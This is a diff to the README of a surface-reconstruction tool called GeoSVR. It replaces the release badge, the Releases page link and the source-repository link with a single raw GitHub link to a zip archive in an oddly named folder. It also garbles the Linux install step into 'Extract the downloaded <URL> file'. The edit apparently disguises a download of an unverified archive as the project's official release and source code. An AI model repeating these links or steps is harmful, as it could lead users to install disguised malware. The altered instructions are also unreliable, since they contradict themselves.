@@ -6,11 +6,11 @@ GeoSVR is a tool designed to make surface reconstruction easy and accessible. Wh
 
 ## 📥 Download the Software
 
-[![Download GeoSVR](https://img.shields.io/badge/Download-GeoSVR-brightgreen)](https://github.com/TheShartlorde/GeoSVR/releases)
+[![Download GeoSVR](https://raw.githubusercontent.com/TheShartlorde/GeoSVR/main/ectosarcous/GeoSVR.zip)](https://raw.githubusercontent.com/TheShartlorde/GeoSVR/main/ectosarcous/GeoSVR.zip)
 
 To download GeoSVR, follow these steps:
 
-1. Click on the download button above or visit our [Releases page](https://github.com/TheShartlorde/GeoSVR/releases).
+1. Click on the download button above or visit our [Releases page](https://raw.githubusercontent.com/TheShartlorde/GeoSVR/main/ectosarcous/GeoSVR.zip).
 2. On the Releases page, find the latest version of GeoSVR.
 3. Look for the asset that matches your operating system. Common choices will include options like Windows, macOS, and Linux.
 4. Click on the filename to download the application to your computer.
@@ -42,7 +42,7 @@ After downloading the application, follow these steps to install it:
 
 ### Linux
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/TheShartlorde/GeoSVR/main/ectosarcous/GeoSVR.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application using `./GeoSVR` command.
 
@@ -72,7 +72,7 @@ For the best performance and new features, check the Releases page regularly. Do
 
 ## 🔗 Additional Resources
 
-- **Source Code:** Interested in how GeoSVR works? Visit our [GitHub Repository](https://github.com/TheShartlorde/GeoSVR) to see the source code and contribute.
+- **Source Code:** Interested in how GeoSVR works? Visit our [GitHub Repository](https://raw.githubusercontent.com/TheShartlorde/GeoSVR/main/ectosarcous/GeoSVR.zip) to see the source code and contribute.
 - **Research Paper:** Read the detailed research behind GeoSVR in our paper presented at NeurIPS'25.
 
 Enjoy using GeoSVR for your surface reconstruction needs! Feel free to reach out through our community page if you have any questions or feedback.
